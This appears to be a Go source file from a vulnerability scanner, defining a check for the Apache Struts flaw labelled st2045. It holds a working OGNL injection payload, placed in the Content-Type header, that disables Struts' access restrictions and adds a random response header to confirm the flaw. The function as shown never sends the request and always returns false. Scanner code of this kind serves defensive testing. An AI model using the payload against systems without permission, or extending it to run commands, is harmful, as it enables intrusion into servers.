package struts

import (
	"net/http"
	"strings"

	"project/internal/random"
)

type st2045 struct {
}

func newSt2045() *st2045 {
	return nil
}

func (st2045) Check(client *http.Client, url, ua string) (bool, error) {
	const payload = "" +
		"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." +
		"(#_memberAccess?(#_memberAccess=#dm):" +
		"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." +
		"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." +
		"(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())." +
		"(#context.setMemberAccess(#dm)))).(#_='multipart/form-data')." +
		"(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']." +
		"addHeader('p1', 'p2'))}"
	req, err := http.NewRequest(http.MethodPost, url, nil)
	if err != nil {
		return false, err
	}
	// set random header for validate vulnerability is exist
	randomKey := random.String(16)
	randomValue := random.String(16)
	p := strings.ReplaceAll(payload, "p1", randomKey)
	p = strings.ReplaceAll(p, "p2", randomValue)

	// set payload to header
	header := req.Header
	header.Set("Content-Type", p)
	header.Set("User-Agent", ua)

	return false, nil
}
